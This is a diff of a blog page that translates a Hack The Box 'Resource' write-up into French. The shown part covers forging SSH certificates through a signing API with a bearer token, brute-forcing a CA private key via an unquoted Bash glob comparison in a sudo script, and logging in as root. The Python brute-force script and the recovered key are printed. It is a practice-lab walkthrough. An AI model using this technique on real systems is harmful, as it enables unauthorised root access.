+<li>Vous recevrez le certificat SSH en format OpenSSH. Nous utilisons <code>echo &quot;YOUR_SSH_CERTIFICATE&quot; &gt; id_rsa_support-cert.pub</code> pour le stocker dans un fichier car nous n&rsquo;avons pas accès à un éditeur de texte.</li>
 </ul>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/support_ssh_cert.png" alt="support SSH certificate"></p>
 <ol start="3">
-<li>Change the file permissions</li>
+<li>Modifier les permissions des fichiers</li>
 </ol>
 <pre tabindex="0"><code>chmod 600 id_rsa_support
 chmod 600 id_rsa_support-cert.pub
 </code></pre><ol start="4">
-<li>Login via SSH</li>
+<li>Se connecter via SSH</li>
 </ol>
 <pre tabindex="0"><code>ssh -i id_rsa_support -p 2222 support@172.223.0.1
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Resource/support_ssh_login.png" alt="root SSH login"></p>
-<p>The hostname of our previous SSH session (with root) was <code>itrc</code>, now we are logged in as <code>support</code> and the hostname is <code>ssg</code>. The home folder of <code>support</code> is empty, and checking the <code>etc/passwd</code> file on this host shows that <code>zzinter</code> is also a user here.</p>
+<p>Le nom d&rsquo;hôte de notre précédente session SSH (avec root) était <code>itrc</code>, maintenant nous sommes connectés en tant que <code>support</code> et le nom d&rsquo;hôte est <code>ssg</code>. Le dossier personnel de <code>support</code> est vide, et <code>etc/passwd</code> montre que <code>zzinter</code> est aussi un utilisateur ici.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/zzinter_ssg_host.png" alt="zzinter user on ssg host"></p>
-<h3 id="lateral-movement-zzinter-shell-on-ssg-host">Lateral movement (zzinter shell on ssg host)</h3>
-<p>We will repeat the same process and login as <code>zzinter</code> on the new host. The issue here is that we cannot generate a signed certificate by using the script because <code>zzinter</code> is not a supported principal.</p>
-<p>Examining the script again we see that it uses <code>curl</code> to fetch the SSH certificate, it expects three things: a public_key, a username, and some principal(s). Currently we lack a valid principal name.</p>
+<h3 id="mouvement-latéral-shell-en-tant-que-zzinter-sur-lhôte-ssg">Mouvement latéral (Shell en tant que zzinter sur l&rsquo;hôte ssg)</h3>
+<p>Nous allons répéter le même processus et nous connecter en tant que <code>zzinter</code> sur le nouvel hôte. Le problème ici est que nous ne pouvons pas générer un certificat signé en utilisant le script parce que <code>zzinter</code> n&rsquo;est pas un principal supporté.</p>
+<p>En examinant à nouveau le script, nous voyons qu&rsquo;il utilise <code>curl</code> pour récupérer le certificat SSH, la requête nécessite trois informations: une clé publique, un nom d&rsquo;utilisateur, et un ou plusieurs utilisateur(s). Actuellement, nous n&rsquo;avons pas de nom d&rsquo;utilisateur valide.</p>
 <pre tabindex="0"><code>curl -s signserv.ssg.htb/v1/sign -d &#39;{&#34;pubkey&#34;: &#34;&#39;&#34;$public_key&#34;&#39;&#34;, &#34;username&#34;: &#34;&#39;&#34;$username&#34;&#39;&#34;, &#34;principals&#34;: &#34;&#39;&#34;$principal&#34;&#39;&#34;}&#39; -H &#34;Content-Type: application/json&#34; -H &#34;Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE&#34;
-</code></pre><p>The content of <code>/etc/ssh/sshd_config.d/sshcerts.conf</code> shows us that a principal file located at <code>/etc/ssh/auth_principals</code> is used by SSH on this host. Checking the file we find <code>zzinter_temp</code> to be a valid principal namae for <code>zzinter</code>.</p>
+</code></pre><p>Le contenu de <code>/etc/ssh/sshd_config.d/sshcerts.conf</code> nous montre qu&rsquo;un fichier situé dans <code>/etc/ssh/auth_principals</code> est utilisé par SSH sur cet hôte. En vérifiant le fichier, nous trouvons que <code>zzinter_temp</code> est un nom valide pour <code>zzinter</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/principal_file.png" alt="SSH principal file"></p>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/zzinter_temp.png" alt="zzinter valid principal name"></p>
-<p>With all the required elements we can now repeat the process used earlier.</p>
+<p>Avec tous les éléments nécessaires, nous pouvons maintenant répéter le processus utilisé précédemment.</p>
 <ol>
-<li>Generate an SSH key for zzinter.</li>
+<li>Générer une clé SSH pour zzinter.</li>
 </ol>
 <pre tabindex="0"><code>ssh-keygen -t rsa -b 4096 -f id_rsa_zzinter
 </code></pre><ol start="2">
-<li>To obtain our signed certificate we send a request with curl.</li>
+<li>Pour obtenir notre certificat signé, nous envoyons une requête avec curl.</li>
 </ol>
 <pre tabindex="0"><code>curl signserv.ssg.htb/v1/sign -d &#39;{&#34;pubkey&#34;: &#34;YOUR_GENERATED_PUBLIC_KEY&#34;, &#34;username&#34;: &#34;zzinter&#34;, &#34;principals&#34;: &#34;zzinter_temp&#34;}&#39; -H &#34;Content-Type: application/json&#34; -H &#34;Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE&#34;
 </code></pre><ul>
-<li>Store the certificate in a file.</li>
+<li>Stocker le certificat dans un fichier.</li>
 </ul>
 <pre tabindex="0"><code>echo &#34;YOUR_SSH_CERTIFICATE&#34; &gt; id_rsa_zzinter-cert.pub
 </code></pre><ol start="3">
-<li>Modify the file permissions.</li>
+<li>Modifier les permissions des clés.</li>
 </ol>
 <pre tabindex="0"><code>chmod 600 id_rsa_zzinter
 chmod 600 id_rsa_zzinter-cert.pub
 </code></pre><ol start="4">
-<li>Login as <code>zzinter</code> on the new host.</li>
+<li>Connectez-vous en tant que <code>zzinter</code> sur le nouvel hôte.</li>
 </ol>
 <pre tabindex="0"><code>ssh -i id_rsa_zzinter -p 2222 zzinter@172.223.0.1
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Resource/zzinter_ssh_ssg_host.png" alt="zzinter ssh login on ssg host"></p>
-<h2 id="privilege-escalation-root-shell-on-ssg-host">Privilege Escalation (root shell on ssg host)</h2>
-<p>The home folder of <code>zzinter</code> only contains the user flag, but running <code>sudo -l</code> we learn that this user can execute <code>/opt/sign_key.sh</code> as root without providing a password.</p>
+<h2 id="elévation-de-privilèges-shell-en-tant-que-root-sur-lhôte-ssg">Elévation de Privilèges (Shell en tant que root sur l&rsquo;hôte ssg)</h2>
+<p>Le dossier personnel de <code>zzinter</code> ne contient que le drapeau de utilisateur, mais avec <code>sudo -l</code> nous apprenons que cet utilisateur peut exécuter <code>/opt/sign_key.sh</code> en tant que root sans fournir de mot de passe.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/sudo-l-cmd.png" alt="sudo -l command"></p>
-<p>The output of <code>sign_key.sh</code> is as below. The script is similar to the <code>sign_key_api.sh</code> script, it uses <code>ssh-keygen</code> to sign an SSH public key using a specified CA private key to create a signed SSH certificate. It expects five arguments and also performs a matching operation with the <code>/etc/ssh/ca-it</code>.</p>
+<p>Vous trouverez ci-dessous le contenu de <code>sign_key.sh</code>. Le script est similaire au script <code>sign_key_api.sh</code>, il utilise <code>ssh-keygen</code> pour signer une clé publique SSH en utilisant la clé privée de l&rsquo;autorité de certification spécifiée pour créer un certificat SSH signé. Il attend cinq arguments et effectue également une opération de comparaison avec le fichier <code>/etc/ssh/ca-it</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
 </span></span><span style="display:flex;"><span>usage <span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
@@ -525,10 +525,10 @@ chmod 600 id_rsa_zzinter-cert.pub
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>ssh-keygen -s <span style="color:#e6db74">&#34;</span>$ca_file<span style="color:#e6db74">&#34;</span> -z <span style="color:#e6db74">&#34;</span>$serial<span style="color:#e6db74">&#34;</span> -I <span style="color:#e6db74">&#34;</span>$username<span style="color:#e6db74">&#34;</span> -V -1w:forever -n <span style="color:#e6db74">&#34;</span>$principal<span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span>$public_key_file<span style="color:#e6db74">&#34;</span>
-</span></span></code></pre></div><p>After reviewing the script carefully we discover a vulnerability, the right side of the matching operation <code>[[ $itca == $ca ]]</code> is not quoted, making this succeptible to brute force attacks. Without those quotes Bash performs pattern matching instead of interpreting the input as a string.</p>
-<p>For instance if we have a password matching operation with <code>[[$DB_PASS == mystrongpassword]]</code>, inputting <code>mys*</code> will evaluate to <code>true</code> because it is a glob pattern matching any string starting with those three letters. Similarly, in the <code>sign_key.sh</code> script, the line <code>[[ $itca == $ca ]]</code> compares the two strings without quoting allowing us to reconstruct the CA content incrementally by brute forcing it. We use the script below to find the CA content.</p>
+</span></span></code></pre></div><p>Après avoir examiné attentivement le script, nous découvrons une vulnérabilité: le côté droit de l&rsquo;opération de correspondance <code>[[ $itca == $ca ]]</code> n&rsquo;est pas entre guillemets, ce qui le rend vulnérable aux attaques par force brute. Sans ces guillemets, Bash effectue un &ldquo;pattern matching&rdquo; au lieu d&rsquo;interpréter les données comme une chaîne de caractères.</p>
+<p>Par exemple, si nous avons une opération de recherche de mot de passe avec <code>[[$DB_PASS == mystrongpassword]]</code>, la saisie de <code>mys*</code> sera évaluée à <code>vrai</code> parce que c&rsquo;est un pattern global correspondant à n&rsquo;importe quelle chaîne commençant par ces trois lettres. De même, dans le script <code>sign_key.sh</code>, la ligne <code>[[ $itca == $ca ]]</code> compare les deux chaînes sans les guillemets, ce qui nous permet de reconstruire le contenu de la clé du CA (Autorité de Certification) de manière progressive, un caractère à la fois. Nous utilisons le script ci-dessous pour récupérer la clé.</p>
 <blockquote>
-<p>In <code>etc/ssh/auth_principals/root</code> we find the valid principal name for root is <code>root_user</code>.</p>
+<p>Dans <code>etc/ssh/auth_principals/root</code> nous trouvons que le nom de principal valide pour root est <code>root_user</code>.</p>
 </blockquote>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
 </span></span><span style="display:flex;"><span>
@@ -542,7 +542,6 @@ chmod 600 id_rsa_zzinter-cert.pub
 </span></span><span style="display:flex;"><span>    found_character <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> charset:
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Create the temporary CA file with the current guess</span>
 </span></span><span style="display:flex;"><span>        current_guess <span style="color:#f92672">=</span> discovered_ca <span style="color:#f92672">+</span> char <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;*&#34;</span>
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(temp_ca_file, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
 </span></span><span style="display:flex;"><span>            f<span style="color:#f92672">.</span>write(current_guess)
@@ -566,9 +565,9 @@ chmod 600 id_rsa_zzinter-cert.pub
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
 </span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Script terminated prematurely. Partial CA content:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">{</span>discovered_ca<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
-</span></span></code></pre></div><p>After running the script we recover the key and save it in a file (I named it <code>root.key</code> in my case).</p>
+</span></span></code></pre></div><p>Après avoir exécuté le script, nous récupérons la clé et la sauvegardons dans un fichier (que j&rsquo;ai nommé <code>root.key</code> dans mon cas).</p>
 <blockquote>
-<p>We need to add <code>-----END OPENSSH PRIVATE KEY-----</code> to the key manually.</p>
+<p>Nous devons ajouter manuellement <code>-----END OPENSSH PRIVATE KEY-----</code> à la clé.</p>
 </blockquote>
 <pre tabindex="0"><code>-----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
@@ -579,17 +578,17 @@ cW7Q4MoZuezAE8mNFSmxAAAAIkdsb2JhbCBTU0cgU1NIIENlcnRmaWNpYXRlIGZyb20gSV
 QBAgM=
 -----END OPENSSH PRIVATE KEY-----
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Resource/CA_content.png" alt="CA content"></p>
-<p>We can go back to our local machine, and generate SSH keys for root.</p>
+<p>Nous pouvons retourner sur notre machine locale et générer des clés SSH pour root.</p>
 <ol>
-<li>Generate a key pair for root</li>
+<li>Générer une paire de clés pour root.</li>
 </ol>
 <pre tabindex="0"><code>ssh-keygen -f root
 </code></pre><ol start="2">
-<li>Change the permission of the key recovered.</li>
+<li>Modifier l&rsquo;autorisation de la clé récupérée.</li>
 </ol>
 <pre tabindex="0"><code>chmod 600 root.key
 </code></pre><ol start="3">
-<li>Create a SSH certificate by signing the public key.</li>
+<li>Créez un certificat SSH en signant la clé publique.</li>
 </ol>
 <pre tabindex="0"><code>ssh-keygen -s root.key -z 200 -I root -V -52w:forever -n root_user root.pub
 </code></pre><table>
@@ -602,39 +601,41 @@ QBAgM=
 <tbody>
 <tr>
 <td>-s root.key</td>
-<td>Specifies the signing key, which is the private key of the Certificate Authority (CA).</td>
+<td>Spécifie la clé de signature, qui est la clé privée de l&rsquo;autorité de certification (CA).</td>
 </tr>
 <tr>
 <td>-z 200</td>
-<td>Specifies the certificate serial number. This is a unique identifier for the certificate.</td>
+<td>Indique le numéro de série du certificat. Il s&rsquo;agit d&rsquo;un identifiant unique pour le certificat.</td>
 </tr>
 <tr>
 <td>-I root</td>
-<td>Specifies the key identity string. The identity (<code>root</code>) is an arbitrary label for the certificate.</td>
+<td>Spécifie l&rsquo;identité de la clé. L&rsquo;identité (<code>root</code>) est un label arbitraire pour le certificat.</td>
 </tr>
 <tr>
 <td>-V -52w:forever</td>
-<td>Specifies the validity period.</td>
+<td>Spécifie la période de validité.</td>
 </tr>
 <tr>
 <td>-n root_user</td>
-<td>Specifies the authorized principals (usernames or roles).</td>
+<td>Spécifie les principaux autorisés (noms d&rsquo;utilisateur ou rôles).</td>
 </tr>
 <tr>
 <td>root.pub</td>
-<td>Specifies the public key file being signed. The certificate will be generated for this key, and the resulting file will be named <code>root-cert.pub</code>.</td>
+<td>Spécifie le fichier de clé publique à signer. Le certificat sera généré pour cette clé, et le fichier résultant sera nommé <code>root-cert.pub</code>.</td>
 </tr>
 </tbody>
 </table>
 <ol start="4">
-<li>Login as root</li>
+<li>Se connecter en tant que root</li>
 </ol>
 <pre tabindex="0"><code>ssh root@itrc.ssg.htb -p2222 -i root -i root-cert.pub
 </code></pre><blockquote>
-<p>The private key (<code>root</code>) provides proof of ownership, while the certificate (<code>root-cert.pub</code>) establishes trust between our key and the server. The server validates the certificate using the CA public key stored in its configuration (from <code>TrustedUserCAKeys</code>), and then uses the private key to complete the authentication process. The certificate tells the server to trust the public key in <code>root.pub</code> because it was signed by the trusted Certificate Authority (CA). Without the certificate, the server wouldn’t recognize the root key as a trusted identity.</p>
+<p>La clé privée (<code>root</code>) fournit une preuve de propriété, tandis que le certificat (<code>root-cert.pub</code>) établit la confiance entre notre clé et le serveur. Le serveur valide le certificat en utilisant la clé publique de l&rsquo;autorité de certification stockée dans sa configuration (dans <code>TrustedUserCAKeys</code>), et utilise ensuite la clé privée pour compléter le processus d&rsquo;authentification. Le certificat indique au serveur de faire confiance à la clé publique <code>root.pub</code> parce qu&rsquo;elle a été signée par l&rsquo;autorité de certification (CA) de confiance. Sans le certificat, le serveur ne reconnaîtrait pas la clé comme une identité de confiance.</p>
 </blockquote>
 <p><img src="https://scorpiosec.com/images/HTB-Resource/root_flag.png" alt="root ssh login and flag"></p>
-<p>Thanks for reading this write up!</p>
+<p>Merci d&rsquo;avoir lu cet article! Si vous avez des questions, vous pouvez me contacter sur <a href="https://x.com/_KScorpio" target="_blank" >X</a>
+
+.</p>
 
       </div>
     </article>
@@ -646,7 +647,7 @@ QBAgM=
     <p>
         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
 
-        <span class="tag"><a href="https://scorpiosec.com/tags/hack-the-box/">Hack The Box</a></span>
+        <span class="tag"><a href="https://scorpiosec.com/fr/tags/hack-the-box/">Hack The Box</a></span>
         
     </p>
 
@@ -654,7 +655,7 @@ QBAgM=
     <p>
         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
 
-        <span class="tag"><a href="https://scorpiosec.com/categories/writeups/">Writeups</a></span>
+        <span class="tag"><a href="https://scorpiosec.com/fr/categories/writeups/">Writeups</a></span>
         
     </p>
 
@@ -667,7 +668,7 @@ QBAgM=
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        2332 Words
+        2459 Mots
       </p>
 
       <p>
@@ -689,7 +690,7 @@ QBAgM=
       <hr />
       <div class="sharing-buttons">
         
-<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-resource%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-resource%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
   <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
     </div>
@@ -697,7 +698,7 @@ QBAgM=
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-resource%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-resource%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
   <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
       <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
         <svg role="img" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
@@ -709,7 +710,7 @@ QBAgM=
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HTB%3a%20Resource&amp;caption=HTB%3a%20Resource&amp;canonicalUrl=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-resource%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HTB%3a%20Resource&amp;caption=HTB%3a%20Resource&amp;canonicalUrl=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-resource%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
   <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
     <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
@@ -718,7 +719,7 @@ QBAgM=
 </a>
 
 
-<a class="resp-sharing-button__link" href="mailto:?subject=HTB%3a%20Resource&amp;body=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-resource%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+<a class="resp-sharing-button__link" href="mailto:?subject=HTB%3a%20Resource&amp;body=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-resource%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
   <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
     </div>
@@ -726,7 +727,7 @@ QBAgM=
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-resource%2f&amp;media=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-resource%2f;description=HTB%3a%20Resource" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-resource%2f&amp;media=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-resource%2f;description=HTB%3a%20Resource" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
   <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
     </div>
@@ -734,7 +735,7 @@ QBAgM=
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-resource%2f&amp;title=HTB%3a%20Resource&amp;summary=HTB%3a%20Resource&amp;source=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-resource%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-resource%2f&amp;title=HTB%3a%20Resource&amp;summary=HTB%3a%20Resource&amp;source=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-resource%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
   <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
     </div>
@@ -742,7 +743,7 @@ QBAgM=
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-resource%2f&amp;resubmit=true&amp;title=HTB%3a%20Resource" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-resource%2f&amp;resubmit=true&amp;title=HTB%3a%20Resource" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
   <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
     </div>
@@ -750,7 +751,7 @@ QBAgM=
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-resource%2f;title=HTB%3a%20Resource" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-resource%2f;title=HTB%3a%20Resource" target="_blank" rel="noopener" aria-label="" title="Share on xing">
   <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
     </div>
@@ -758,7 +759,7 @@ QBAgM=
 </a>
 
 
